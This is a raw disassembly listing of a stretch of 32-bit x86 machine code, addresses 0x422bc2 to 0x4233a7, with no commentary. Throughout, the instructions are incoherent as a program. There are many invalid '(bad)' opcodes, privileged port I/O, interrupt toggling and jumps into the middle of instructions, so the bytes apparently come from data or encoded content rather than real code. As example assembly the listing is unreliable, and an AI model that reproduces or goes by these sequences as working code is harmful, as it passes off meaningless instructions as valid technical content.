  422bc2:	xchg   BYTE PTR [ecx+0xc],ah
  422bc5:	lea    ecx,[ebp+0x5901cbf8]
  422bcb:	add    DWORD PTR [ebx-0x80],ebp
  422bce:	out    0x8a,eax
  422bd0:	xor    BYTE PTR [edi+0x32],0x43
  422bd4:	out    0x35,eax
  422bd6:	xor    edi,DWORD PTR [eax+edx*2+0x77]
  422bda:	xchg   BYTE PTR [edx-0x73],ah
  422bdd:	xchg   BYTE PTR [edi+0x98d8d0c],al
  422be3:	dec    edi
  422be4:	repnz lea ecx,[ebp-0x370f7073]
  422beb:	xor    esp,edi
  422bed:	xchg   DWORD PTR [esp+edi*4+0xbefbecd],edx
  422bf4:	mov    al,ds:0xec9d8894
  422bf9:	or     eax,0xeb6501a9
  422bfe:	mov    dl,0xbc
  422c00:	out    dx,eax
  422c01:	mov    WORD PTR gs:[esi-0x3a17beff],gs
  422c08:	mov    eax,ds:0x99968d8d
  422c0d:	cli    
  422c0e:	lea    edi,[edx]
  422c10:	lea    ecx,[ebp-0x1bc59df6]
  422c16:	push   ebp
  422c17:	and    bh,0x8a
  422c1a:	inc    ebx
  422c1b:	out    0x83,eax
  422c1d:	or     eax,esp
  422c1f:	imul   eax,DWORD PTR [eax-0x43495039],0xffffff80
  422c26:	push   ecx
  422c27:	xor    ecx,DWORD PTR [ebx-0x14]
  422c2a:	push   ecx
  422c2b:	add    ebp,eax
  422c2d:	lock lea eax,[esi-0x7272f3a0]
  422c34:	cmp    ch,0xb2
  422c37:	mov    bh,ch
  422c39:	in     eax,dx
  422c3a:	mov    edx,0xfa05633a
  422c3f:	lea    edi,[edx]
  422c41:	lea    ecx,[ebp-0x39c5e29]
  422c47:	in     al,0x9c
  422c49:	les    esp,FWORD PTR [edi]
  422c4b:	add    bh,0xaf
  422c4e:	xchg   cl,ch
  422c50:	or     al,0x8d
  422c52:	(bad)  
  422c53:	loop   0x422c8f
  422c55:	scas   al,BYTE PTR es:[edi]
  422c56:	in     al,dx
  422c57:	sti    
  422c58:	in     al,dx
  422c59:	ret    0x86ed
  422c5c:	cmp    ch,ch
  422c5e:	mov    BYTE PTR [edx],bh
  422c60:	sub    BYTE PTR [edx+0x63],0xfc
  422c64:	sub    BYTE PTR [edx-0x1c],0xb4
  422c68:	scas   al,BYTE PTR es:[edi]
  422c69:	fsubr  st,st(5)
  422c6b:	test   DWORD PTR [edi],ebp
  422c6d:	fiadd  DWORD PTR [eax-0x27f61b02]
  422c73:	in     eax,dx
  422c74:	test   edi,edi
  422c76:	fimul  DWORD PTR [esi-0x1b8ff212]
  422c7c:	out    dx,al
  422c7d:	mov    cs,WORD PTR [ebp+ecx*1-0x5549bc90]
  422c84:	(bad)  
  422c85:	leave  
  422c86:	bound  esi,QWORD PTR [edx-0x367902f3]
  422c8c:	or     al,0x8d
  422c8e:	(bad)  
  422c8f:	xlat   BYTE PTR ds:[ebx]
  422c90:	adc    eax,0x9faeab9d
  422c95:	scas   al,BYTE PTR es:[edi]
  422c96:	lahf   
  422c97:	dec    ebp
  422c98:	push   ebp
  422c99:	xor    eax,0xb5f1aa96
  422c9e:	outs   dx,DWORD PTR ds:[esi]
  422c9f:	lea    ecx,[ebp-0x2c3b7272]
  422ca5:	bound  edx,QWORD PTR [ecx-0x7e7902f3]
  422cab:	or     al,0x8d
  422cad:	(bad)  
  422cae:	xlat   BYTE PTR ds:[ebx]
  422caf:	dec    ecx
  422cb0:	bound  eax,QWORD PTR ds:0x1786fd0d
  422cb6:	or     al,0x8d
  422cb8:	(bad)  
  422cb9:	xlat   BYTE PTR ds:[ebx]
  422cba:	xchg   ebx,eax
  422cbb:	popf   
  422cbc:	mov    WORD PTR gs:[edx+0x30],fs
  422cc0:	in     al,0xc
  422cc2:	(bad)  
  422cc3:	dec    DWORD PTR [edx]
  422cc5:	adc    bh,0x8a
  422cc8:	inc    ebx
  422cc9:	xlat   BYTE PTR ds:[ebx]
  422cca:	and    DWORD PTR [ebx-0x29],0x35
  422cce:	or     edx,ebp
  422cd0:	mov    dh,0x3a
  422cd2:	lea    ecx,[ebp-0x75187fba]
  422cd8:	cmc    
  422cd9:	mov    esi,0x8d8d3adc
  422cde:	bound  eax,QWORD PTR [edx-0x72c5347a]
  422ce4:	lea    eax,[eax+0x23d582d7]
  422cea:	(bad)  
  422ceb:	stc    
  422cec:	xchg   BYTE PTR [eax],cl
  422cee:	cmp    cl,BYTE PTR [ebp+0x7ad7808d]
  422cf4:	aad    0x30
  422cf6:	adc    bh,0xf7
  422cf9:	xor    al,0x7a
  422cfc:	push   eax
  422cfd:	lock test DWORD PTR [eax-0xfaf7d10],0x83f0807a
  422d08:	push   eax
  422d09:	lock adc BYTE PTR [eax-0x29],0x83
  422d0e:	popf   
  422d0f:	stos   DWORD PTR es:[edi],eax
  422d10:	lahf   
  422d11:	icebp  
  422d12:	mov    ebp,0x8e8d8da6
  422d17:	out    dx,eax
  422d18:	in     al,dx
  422d19:	pushf  
  422d1a:	stos   BYTE PTR es:[edi],al
  422d1b:	fwait
  422d1c:	mov    WORD PTR gs:[edi-0x11f31b4e],cs
  422d23:	in     al,dx
  422d24:	or     al,BYTE PTR [eax-0x5795039]
  422d2a:	cmp    cl,BYTE PTR [ebp-0x7fea2873]
  422d30:	ja     0x422cb8
  422d32:	and    bh,0xaf
  422d35:	mov    dl,0x84
  422d37:	in     al,dx
  422d38:	inc    ebx
  422d39:	jo     0x422d1d
  422d3b:	out    dx,eax
  422d3c:	test   eax,0xee7be501
  422d41:	les    edx,FWORD PTR [edi-0x80]
  422d44:	(bad)  
  422d45:	scas   eax,DWORD PTR es:[edi]
  422d46:	in     eax,dx
  422d47:	js     0x422d55
  422d49:	xchg   BYTE PTR [eax],ch
  422d4b:	cmp    cl,BYTE PTR [ebp-0x7fe22873]
  422d51:	ja     0x422cd9
  422d53:	and    bh,0xaf
  422d56:	mov    dl,0x84
  422d58:	in     al,dx
  422d59:	loop   0x422d4a
  422d5b:	lahf   
  422d5c:	loop   0x422d4d
  422d5e:	test   eax,0xee7b6601
  422d63:	cmp    cl,BYTE PTR [ebp+0x6c71c48d]
  422d69:	out    dx,al
  422d6a:	or     al,0x8d
  422d6c:	(bad)  
  422d6d:	in     al,dx
  422d6e:	out    0xaf,eax
  422d70:	loop   0x422de3
  422d72:	lahf   
  422d73:	cli    
  422d74:	lea    edi,[edx]
  422d76:	lea    ecx,[ebp+0x43f9f050]
  422d7c:	push   0x6d
  422d7e:	and    BYTE PTR [ecx-0x7a],0xbd
  422d82:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422d88:	push   ecx
  422d89:	in     al,0xc6
  422d8b:	cmp    dh,al
  422d8d:	stc    
  422d8e:	in     eax,dx
  422d8f:	out    0x76,eax
  422d91:	out    dx,al
  422d92:	or     ebp,ebp
  422d94:	bound  ecx,QWORD PTR [ebp+0x77ed8d8d]
  422d9a:	jbe    0x422d28
  422d9c:	xor    al,0xf9
  422d9f:	in     eax,dx
  422da0:	retf   
  422da1:	out    dx,al
  422da2:	in     al,0xec
  422da4:	loop   0x422d92
  422da6:	lahf   
  422da7:	and    bh,0xfd
  422daa:	mov    dl,0xba
  422dac:	outs   dx,DWORD PTR ds:[esi]
  422dad:	inc    ebx
  422dae:	push   0x6d
  422db0:	loop   0x422e1f
  422db2:	test   eax,0xadc96601
  422db7:	in     al,dx
  422db8:	lea    ecx,[ebp+0x45866180]
  422dbe:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422dc4:	push   ecx
  422dc5:	in     al,0xc6
  422dc7:	push   eax
  422dc8:	lock xchg BYTE PTR [eax-0x10],dl
  422dcc:	sub    ebp,0xffffffcb
  422dcf:	out    dx,al
  422dd0:	in     al,0xd3
  422dd2:	add    BYTE PTR ds:0x3a83b7ed,0xb6
  422dd9:	mov    ch,ch
  422ddb:	lock or DWORD PTR [ecx+esi*4],0xffffffed
  422de0:	retf   
  422de1:	mov    eax,ds:0x225e1fd3
  422de6:	or     al,0x8d
  422de8:	lea    eax,[ebx-0x4e]
  422deb:	adc    BYTE PTR [ecx+0x72],0xb7
  422def:	sub    esp,0x77
  422df2:	xor    DWORD PTR [esi-0x288137c],0x50
  422df9:	ja     0x422daa
  422dfb:	les    eax,FWORD PTR [edi-0x13]
  422dfe:	mov    dh,ch
  422e00:	xchg   BYTE PTR [eax],bh
  422e02:	lea    ecx,[ebp-0x493b4973]
  422e08:	mov    bh,0x83
  422e0a:	pop    edi
  422e0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e0c:	test   ah,ah
  422e0e:	outs   dx,DWORD PTR ds:[esi]
  422e0f:	dec    ebp
  422e10:	ja     0x422d95
  422e12:	aas    
  422e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e14:	test   BYTE PTR [ecx+0x755e86d7],dh
  422e1a:	outs   dx,DWORD PTR ds:[esi]
  422e1b:	lea    ecx,[ebp+0x50fd77ec]
  422e21:	ja     0x422dd2
  422e23:	mov    dl,0xb7
  422e25:	sub    esi,0xffffffe2
  422e28:	out    dx,al
  422e29:	test   eax,0x807b4d43
  422e2e:	jl     0x422db0
  422e30:	(bad)  
  422e31:	scas   eax,DWORD PTR es:[edi]
  422e32:	xchg   al,ah
  422e34:	lea    ecx,[ebp-0x2ac5c173]
  422e3a:	in     al,dx
  422e3b:	xor    bh,ah
  422e3d:	xor    DWORD PTR [esi-0x78284e44],0xffffffc4
  422e44:	lea    ecx,[ebp+0x77]
  422e47:	add    DWORD PTR [eax-0x4d120610],0xc
  422e4e:	and    bh,0x8a
  422e51:	cmp    BYTE PTR [ebx+eax*2+0x77],0x35
  422e56:	pop    edi
  422e57:	ja     0x422ddc
  422e59:	fcmovnu st,st(2)
  422e5b:	or     BYTE PTR [ebx+0x43],0xd7
  422e5f:	add    DWORD PTR [eax-0xab9c269],0x63
  422e66:	test   ebx,edx
  422e68:	in     al,dx
  422e69:	jg     0x422e42
  422e6b:	dec    ebx
  422e6c:	push   eax
  422e6d:	out    0x8a,eax
  422e6f:	or     eax,esp
  422e71:	xor    ah,BYTE PTR [ebx-0x19]
  422e74:	cmp    eax,0xccaaea09
  422e79:	dec    ebp
  422e7a:	dec    ebp
  422e7b:	xchg   dl,dl
  422e7d:	lea    ecx,[ebp+0x16a438d]
  422e83:	lds    esi,FWORD PTR ds:0x2d978065
  422e89:	adc    bh,0x8b
  422e8c:	inc    ebx
  422e8d:	xlat   BYTE PTR ds:[ebx]
  422e8e:	sbb    eax,0x9780d450
  422e93:	inc    ebp
  422e94:	and    bh,0x8a
  422e97:	inc    ebx
  422e98:	out    0x35,eax
  422e9a:	push   eax
  422e9b:	(bad)  
  422e9c:	jo     0x422e41
  422e9e:	test   eax,0x8d25fbab
  422ea3:	test   eax,0x6d6a439d
  422ea8:	les    eax,FWORD PTR [edx-0x7272f95e]
  422eae:	lea    edi,[edx]
  422eb0:	in     al,0x3a
  422eb2:	je     0x422e66
  422eb4:	mov    ah,0xef
  422eb6:	cdq    
  422eb7:	adc    bh,0x8b
  422eba:	arpl   di,dx
  422ebc:	and    eax,0x7780f9d3
  422ec1:	test   BYTE PTR [edx+0x5046ef84],dh
  422ec7:	ja     0x422e4d
  422ec9:	push   eax
  422eca:	xlat   BYTE PTR ds:[ebx]
  422ecb:	mov    ebp,DWORD PTR [ecx+0x76f08074]
  422ed1:	or     eax,esp
  422ed3:	push   0xffffffb2
  422ed5:	mov    edx,0x8677ecee
  422eda:	in     al,dx
  422edb:	mov    dl,0xc4
  422edd:	outs   dx,DWORD PTR ds:[esi]
  422ede:	or     eax,esp
  422ee0:	push   0xffffffec
  422ee2:	ja     0x422f5a
  422ee4:	add    bh,0xfd
  422ee7:	add    ebp,eax
  422ee9:	ja     0x422e78
  422eeb:	inc    ebx
  422eec:	push   0x1
  422eee:	lds    esi,FWORD PTR [edi-0x73]
  422ef1:	mov    ds:0x8d8d8d06,al
  422ef6:	cmp    dl,bl
  422ef8:	and    eax,0x5d353180
  422efd:	mov    dl,0xb5
  422eff:	xor    eax,0x3163ef2d
  422f04:	xor    eax,0x8f26d3a5
  422f09:	push   cs
  422f0a:	dec    ebp
  422f0b:	jne    0x422f42
  422f0d:	pop    ebp
  422f0e:	mov    dl,0xb4
  422f10:	out    dx,eax
  422f11:	adc    BYTE PTR [ebp+0x11802d35],dl
  422f17:	or     DWORD PTR [edi+edx*4-0x73],ebx
  422f1b:	mov    dl,0xbe
  422f1d:	dec    DWORD PTR [ecx]
  422f1f:	and    bh,dh
  422f21:	pop    edi
  422f22:	xor    DWORD PTR ds:0x801bd32d,esi
  422f28:	mov    al,ds:0x8def8d60
  422f2d:	lea    eax,[ebx-0x2]
  422f30:	mov    dl,0xbe
  422f32:	das    
  422f33:	mov    ecx,0xec8df03a
  422f38:	push   0x1
  422f3a:	lds    esi,FWORD PTR ds:0x7b2746d
  422f40:	das    
  422f41:	aas    
  422f42:	xor    DWORD PTR ds:0xb9a0432d,esi
  422f48:	aas    
  422f49:	xchg   edi,eax
  422f4a:	(bad)  
  422f4b:	in     al,dx
  422f4c:	push   0xffffffed
  422f4e:	push   0x3a
  422f50:	add    ebp,eax
  422f52:	xor    eax,0x8099746d
  422f57:	sub    al,BYTE PTR [esi+0x4d4d069c]
  422f5d:	sbb    BYTE PTR [eax+eax*4+0x6ffc51],0x86
  422f65:	repnz push es
  422f67:	dec    ebp
  422f68:	dec    ebp
  422f69:	cdq    
  422f6a:	sub    BYTE PTR [edx],0xfc
  422f6d:	jns    0x422f9e
  422f6f:	stos   DWORD PTR es:[edi],eax
  422f70:	xchg   BYTE PTR [ebx-0x66b2b2fa],dh
  422f76:	cld    
  422f77:	jns    0x422fe8
  422f79:	mov    ds:0x4d063986,eax
  422f7e:	dec    ebp
  422f7f:	cld    
  422f80:	jns    0x422f8e
  422f82:	cdq    
  422f83:	cmp    BYTE PTR [esi-0x42],0xc4
  422f87:	test   DWORD PTR [ebp+0x4d],ecx
  422f8a:	xchg   edi,eax
  422f8b:	add    BYTE PTR [edi+0x3a4587a2],0x8d
  422f92:	lea    edi,[edi+esi*2-0x75]
  422f96:	mul    BYTE PTR [edi+ebp*2]
  422f99:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  422f9d:	cmc    
  422f9e:	and    al,0x6f
  422fa0:	cmp    BYTE PTR [eax+0x7750ef77],al
  422fa6:	out    dx,eax
  422fa7:	xor    BYTE PTR [edi-0x75],0x80
  422fab:	xchg   edi,eax
  422fac:	mov    edx,DWORD PTR [ebx+0xde29b99]
  422fb2:	lahf   
  422fb3:	push   ebx
  422fb4:	mov    dh,0xb2
  422fb6:	clc    
  422fb7:	sub    DWORD PTR [edx+eiz*1+0x24],esp
  422fbb:	outs   dx,DWORD PTR ds:[esi]
  422fbc:	cmp    BYTE PTR [ebx+0x74],dl
  422fbf:	mov    dl,0x86
  422fc1:	or     al,0xff
  422fc3:	sti    
  422fc4:	push   eax
  422fc5:	ja     0x42303d
  422fc7:	xor    BYTE PTR [edi-0x75],0x80
  422fcb:	xchg   edi,eax
  422fcc:	mov    edx,DWORD PTR [ebx+0x74]
  422fcf:	mov    dl,0x86
  422fd1:	or     al,0x53
  422fd3:	mov    dh,0xb2
  422fd5:	clc    
  422fd6:	sub    edi,edi
  422fd8:	sti    
  422fd9:	push   eax
  422fda:	ja     0x422f66
  422fdc:	xor    BYTE PTR [edi-0x75],0x80
  422fe0:	xchg   edi,eax
  422fe1:	mov    edx,DWORD PTR [ebx+0x74]
  422fe4:	mov    dl,0x86
  422fe6:	or     al,0x53
  422fe8:	mov    dh,0xb2
  422fea:	clc    
  422feb:	sub    edi,edi
  422fed:	sti    
  422fee:	push   eax
  422fef:	ja     0x423053
  422ff1:	xor    BYTE PTR [edi-0x75],0x80
  422ff5:	xchg   edi,eax
  422ff6:	mov    edx,DWORD PTR [ebx+0x74]
  422ff9:	mov    dl,0x86
  422ffb:	or     al,0x53
  422ffd:	mov    dh,0xb2
  422fff:	clc    
  423000:	sub    edi,edi
  423002:	sti    
  423003:	push   eax
  423004:	ja     0x422f8c
  423006:	jl     0x42307f
  423008:	mul    BYTE PTR cs:[esi+ebp*8]
  42300c:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423010:	mul    BYTE PTR [ebx+0x777c386f]
  423016:	es cli 
  423018:	and    al,0x6f
  42301a:	cmp    dl,ah
  42301c:	cmp    eax,0x6277509d
  423021:	push   eax
  423022:	ja     0x423086
  423024:	loop   0x422fe3
  423026:	popf   
  423027:	push   eax
  423028:	ja     0x42308c
  42302a:	push   eax
  42302b:	ja     0x42308f
  42302d:	jl     0x4230a6
  42302f:	bound  ecx,QWORD PTR [edx]
  423031:	lea    ecx,[ebp+0x62777c8d]
  423037:	jns    0x422fc6
  423039:	lea    ecx,[ebp-0x7f748880]
  42303f:	xchg   edi,eax
  423040:	mov    edx,DWORD PTR [ebx+0x74]
  423043:	push   ebx
  423044:	mov    dh,0xb2
  423046:	xchg   BYTE PTR [edx+esi*4],cl
  423049:	clc    
  42304a:	sub    edi,edi
  42304c:	sti    
  42304d:	push   eax
  42304e:	ja     0x4230b2
  423050:	xor    BYTE PTR [edi-0x75],0x80
  423054:	xchg   edi,eax
  423055:	mov    edx,DWORD PTR [ebx+0x74]
  423058:	push   ebx
  423059:	mov    dh,0xb2
  42305b:	xchg   BYTE PTR [edx+esi*4],cl
  42305e:	clc    
  42305f:	sub    edi,edi
  423061:	sti    
  423062:	push   eax
  423063:	ja     0x4230c7
  423065:	jl     0x4230de
  423067:	jp     0x42300c
  423069:	or     al,0x8d
  42306b:	lea    edi,[edi+esi*2-0x7c]
  42306f:	pop    edi
  423070:	lea    ecx,[ebp-0x50888373]
  423076:	out    0x8d,eax
  423078:	lea    ecx,[ebp+0xdc86801]
  42307e:	dec    ebp
  42307f:	dec    ebp
  423080:	add    DWORD PTR [eax+0x7a],ebx
  423083:	or     eax,0xfe864d4d
  423088:	or     eax,0xf04d4d4d
  42308d:	scas   eax,DWORD PTR es:[edi]
  42308e:	xlat   BYTE PTR ds:[ebx]
  42308f:	pop    es
  423090:	dec    ebp
  423091:	lock test bh,dl
  423094:	add    al,0x4d
  423096:	lock jp 0x423070
  423099:	jb     0x423117
  42309b:	ja     0x423021
  42309d:	mov    eax,ds:0x808d8d6d
  4230a2:	ja     0x42302f
  4230a4:	xor    al,0x8b
  4230a7:	push   ebx
  4230a8:	je     0x42305c
  4230aa:	xchg   BYTE PTR [edx+eiz*8],cl
  4230ad:	or     eax,0xb25153a9
  4230b2:	mov    edx,0x50b2ff29
  4230b7:	ja     0x423123
  4230b9:	xor    BYTE PTR [edi-0x75],0x80
  4230bd:	lock mov ebp,ebp
  4230c0:	mov    bh,0xc8
  4230c2:	lea    edx,[ebx+0x74]
  4230c5:	mov    dl,0x86
  4230c7:	or     al,0x53
  4230c9:	push   ecx
  4230ca:	mov    dl,0xba
  4230cc:	sub    edi,edi
  4230ce:	mov    dl,0x50
  4230d0:	ja     0x42314c
  4230d2:	mov    ch,0x4a
  4230d4:	sbb    eax,0x508d8d8d
  4230d9:	ja     0x4230a3
  4230db:	sub    BYTE PTR [ebp-0x7f],0x50
  4230df:	ja     0x423068
  4230e1:	sub    BYTE PTR [ebp+0x21],0x50
  4230e5:	ja     0x423119
  4230e7:	xor    BYTE PTR [edi-0x11],0x1
  4230eb:	lock enter 0x1050,0x62
  4230f0:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  4230f6:	add    eax,esi
  4230f8:	xchg   DWORD PTR [eax+0x10],edx
  4230fb:	push   esi
  4230fc:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  423102:	dec    ebp
  423103:	xlat   BYTE PTR ds:[ebx]
  423104:	out    dx,eax
  423105:	add    eax,esi
  423107:	xor    dl,BYTE PTR [eax+0x10]
  42310a:	pop    esi
  42310b:	cmp    cl,BYTE PTR [ebp+0x3fba868d]
  423111:	lea    ecx,[ebp-0x7f740f80]
  423117:	xchg   edi,eax
  423118:	mov    edx,DWORD PTR [ebx+0x11]
  42311b:	push   ebx
  42311c:	jle    0x4230d0
  42311e:	mov    esi,0x29f8b20c
  423123:	(bad)  
  423124:	(bad)  
  423125:	arpl   bp,di
  423127:	or     DWORD PTR [edi],ecx
  423129:	(bad)  
  42312a:	in     al,dx
  42312b:	lea    ecx,[ebp-0x7f108880]
  423131:	int    0x36
  423133:	cmp    cl,BYTE PTR [ebp-0x7f107f73]
  423139:	ja     0x42312a
  42313b:	or     ch,0x36
  42313e:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  423144:	xchg   edx,eax
  423145:	gs xor al,0xef
  423149:	adc    BYTE PTR [eax+0x32],0x3a
  42314d:	lea    ecx,[ebp+0x4d151801]
  423153:	dec    ebp
  423154:	dec    ebp
  423155:	stos   BYTE PTR es:[edi],al
  423156:	adc    BYTE PTR [edi+0x26d180ef],0x3a
  42315d:	lea    ecx,[ebp+0x5aec9080]
  423163:	adc    BYTE PTR [ebp-0x111d7273],cl
  423169:	dec    ebp
  42316a:	bound  eax,QWORD PTR [ecx-0x73]
  42316d:	lea    ecx,[ebp+0x25964daa]
  423173:	push   ebx
  423174:	push   0x7c
  423176:	dec    edi
  423177:	push   ebp
  423178:	dec    ebp
  423179:	dec    ebp
  42317a:	dec    ebp
  42317b:	outs   dx,BYTE PTR ds:[esi]
  42317c:	mov    ds:0x4f7c0a43,eax
  423181:	pop    ebp
  423182:	dec    ebp
  423183:	dec    ebp
  423184:	dec    ebp
  423185:	jg     0x423135
  423187:	push   ebp
  423188:	fwait
  423189:	jl     0x4231da
  42318b:	gs dec ebp
  42318d:	dec    ebp
  42318e:	dec    ebp
  42318f:	stos   DWORD PTR es:[edi],eax
  423190:	lock scas al,BYTE PTR es:[edi]
  423192:	aas    
  423193:	cld    
  423194:	dec    edi
  423195:	ins    DWORD PTR es:[edi],dx
  423196:	dec    ebp
  423197:	dec    ebp
  423198:	dec    ebp
  423199:	xchg   BYTE PTR [ecx],al
  42319b:	push   0x4d4d4d92
  4231a0:	inc    esp
  4231a1:	mov    ecx,0x6a53f544
  4231a6:	jl     0x4231f7
  4231a8:	sub    eax,0x6e4d4d4d
  4231ad:	mov    ds:0x4f7c0a43,eax
  4231b2:	xor    eax,0x7f4d4d4d
  4231b7:	scas   al,BYTE PTR es:[edi]
  4231b8:	push   ebp
  4231b9:	fwait
  4231ba:	jl     0x42320b
  4231bc:	cmp    eax,0xab4d4d4d
  4231c1:	lock scas al,BYTE PTR es:[edi]
  4231c3:	imul   edi,esp,0x4f
  4231c6:	inc    ebp
  4231c7:	dec    ebp
  4231c8:	dec    ebp
  4231c9:	dec    ebp
  4231ca:	xchg   BYTE PTR [ecx],al
  4231cc:	push   0x4d4d4d47
  4231d1:	inc    esp
  4231d2:	mov    ecx,0x7780f544
  4231d7:	out    dx,eax
  4231d8:	or     ch,0x32
  4231db:	cmp    cl,BYTE PTR [ebp-0x10187f73]
  4231e1:	in     eax,dx
  4231e2:	push   0x71
  4231e4:	push   eax
  4231e5:	ja     0x42321d
  4231e7:	xor    BYTE PTR [edi-0x11],0x80
  4231eb:	int    0xfd
  4231ed:	cmp    cl,BYTE PTR [ebp-0x32888373]
  4231f3:	xchg   ebp,eax
  4231f4:	mov    ds:0x777caea5,eax
  4231f9:	lldt   WORD PTR [edi+0x7cb9969d]
  423200:	ja     0x423212
  423202:	aas    
  423203:	xchg   BYTE PTR [edi+ecx*2-0x3b],bh
  423207:	dec    ebp
  423208:	dec    ebp
  423209:	dec    ebp
  42320a:	outs   dx,BYTE PTR ds:[esi]
  42320b:	mov    ds:0x4f7c0a43,eax
  423210:	push   edx
  423211:	dec    ebp
  423212:	dec    ebp
  423213:	dec    ebp
  423214:	jg     0x4231c4
  423216:	aas    
  423217:	xchg   ebp,eax
  423218:	jl     0x423269
  42321a:	aad    0x4d
  42321c:	dec    ebp
  42321d:	dec    ebp
  42321e:	popf   
  42321f:	or     bh,BYTE PTR [edi+0x59]
  423222:	jl     0x423273
  423224:	fisttp QWORD PTR [ebp+0x4d]
  423227:	dec    ebp
  423228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423229:	xchg   edi,eax
  42322a:	lock scas al,BYTE PTR es:[edi]
  42322c:	jl     0x42327d
  42322e:	in     eax,0x4d
  423230:	dec    ebp
  423231:	dec    ebp
  423232:	xchg   esi,eax
  423233:	add    BYTE PTR [edi],bh
  423235:	xchg   BYTE PTR [edi+ecx*2-0x63],bh
  423239:	dec    ebp
  42323a:	dec    ebp
  42323b:	dec    ebp
  42323c:	outs   dx,BYTE PTR ds:[esi]
  42323d:	mov    ds:0x4f7c0a43,eax
  423242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423243:	dec    ebp
  423244:	dec    ebp
  423245:	dec    ebp
  423246:	jg     0x4231f6
  423248:	aas    
  423249:	xchg   ebp,eax
  42324a:	jl     0x42329b
  42324c:	lods   eax,DWORD PTR ds:[esi]
  42324d:	dec    ebp
  42324e:	dec    ebp
  42324f:	dec    ebp
  423250:	popf   
  423251:	or     bh,BYTE PTR [edi+0x59]
  423254:	jl     0x4232a5
  423256:	mov    ch,0x4d
  423258:	dec    ebp
  423259:	dec    ebp
  42325a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42325b:	xchg   edi,eax
  42325c:	lock scas al,BYTE PTR es:[edi]
  42325e:	jl     0x4232af
  423260:	mov    ebp,0x964d4d4d
  423265:	add    BYTE PTR [ebx-0x7a],ch
  423268:	xchg   BYTE PTR [edx+0x3d],ah
  42326b:	lea    ecx,[ebp+0x3677800a]
  423271:	dec    ebp
  423272:	jno    0x4231f4
  423274:	ja     0x423201
  423276:	xor    al,0x8b
  423279:	push   ebx
  42327a:	je     0x4232cf
  42327c:	push   ecx
  42327d:	mov    dl,0xba
  42327f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423285:	xor    al,0x84
  423288:	arpl   WORD PTR [edx+0x3aca0f09],si
  42328e:	lea    ecx,[ebp-0x7f068880]
  423294:	lock stc 
  423296:	push   ebx
  423297:	je     0x4232ec
  423299:	push   ecx
  42329a:	mov    dl,0xba
  42329c:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4232a2:	xor    al,0x84
  4232a5:	inc    ebx
  4232a6:	std    
  4232a7:	xor    BYTE PTR [edi+0x6a],0x63
  4232ab:	mov    dl,0x9
  4232ad:	into   
  4232ae:	xchg   esp,eax
  4232af:	cmp    cl,BYTE PTR [ebp+0x3e777c8d]
  4232b5:	lea    ecx,[ebp+0x77808d8d]
  4232bb:	out    dx,eax
  4232bc:	and    BYTE PTR [edx+0x32],0x3a
  4232c0:	lea    ecx,[ebp-0x7f101880]
  4232c6:	ja     0x4232b7
  4232c8:	or     ch,0x76
  4232cb:	cmp    cl,BYTE PTR [ebp+0x3dda868d]
  4232d1:	lea    ecx,[ebp+0x71994d0a]
  4232d7:	xor    al,0xef
  4232da:	adc    BYTE PTR [eax+0x46],0x3a
  4232de:	lea    ecx,[ebp+0x77803a50]
  4232e4:	out    dx,eax
  4232e5:	sbb    BYTE PTR [esi+0x32],0x3a
  4232e9:	lea    ecx,[ebp+0x53efd780]
  4232ef:	push   0x1
  4232f1:	sbb    BYTE PTR [ebp-0x79b2b2b3],bl
  4232f7:	fwait
  4232f8:	cmp    eax,0x800a8d8d
  4232fd:	ja     0x4232ee
  4232ff:	or     ch,0x46
  423302:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423308:	fwait
  423309:	out    dx,eax
  42330a:	push   eax
  42330b:	ja     0x423323
  42330d:	xor    BYTE PTR [edi-0x11],0x80
  423311:	pop    esi
  423312:	xor    bh,BYTE PTR [edx]
  423314:	lea    ecx,[ebp+0x53efd780]
  42331a:	push   0x1
  42331c:	sbb    ch,al
  42331e:	dec    ebp
  42331f:	dec    ebp
  423320:	dec    ebp
  423321:	xchg   BYTE PTR [ebp+0x3d],al
  423324:	lea    ecx,[ebp-0x10887ff6]
  42332a:	or     ch,0x46
  42332d:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423333:	fwait
  423334:	out    dx,eax
  423335:	xor    BYTE PTR [edi-0x11],0x80
  423339:	pop    esi
  42333a:	xor    bh,BYTE PTR [edx]
  42333c:	lea    ecx,[ebp+0x53efd780]
  423342:	push   0x1
  423344:	sbb    BYTE PTR [ebp+0x4d],dl
  423347:	dec    ebp
  423348:	dec    ebp
  423349:	xchg   dh,ch
  42334b:	cmp    eax,0x800a8d8d
  423350:	ja     0x423341
  423352:	or     ch,0x46
  423355:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  42335b:	fwait
  42335c:	out    dx,eax
  42335d:	in     eax,dx
  42335e:	mov    bh,0x5e
  423360:	lea    edx,[eax+0x77]
  423363:	xor    BYTE PTR ss:[edi+0x5e],0xe2
  423368:	pop    ds
  423369:	push   ebx
  42336a:	jb     0x42330b
  42336c:	dec    ebx
  42336d:	add    eax,0x992fbcd
  423372:	loopne 0x42336f
  423374:	or     cl,BYTE PTR [ebp-0x69]
  423377:	ss dec edi
  423379:	push   0xffffffd7
  42337b:	arpl   WORD PTR [eax-0x7b12a189],ax
  423381:	mov    ebp,gs
  423383:	push   0x6e
  423385:	or     cl,BYTE PTR [ebp-0x69]
  423388:	push   ss
  423389:	dec    edi
  42338a:	push   0xffffffd5
  42338c:	rol    BYTE PTR [eax+0x5e80ef77],cl
  423392:	xor    bh,BYTE PTR [edx]
  423394:	lea    ecx,[ebp+0x53efd780]
  42339a:	push   0x1
  42339c:	xchg   edi,eax
  42339d:	int    0x86
  42339f:	and    bh,BYTE PTR [ebx]
  4233a1:	lea    ecx,[ebp-0x10887ff6]
  4233a7:	or     ch,0x3e
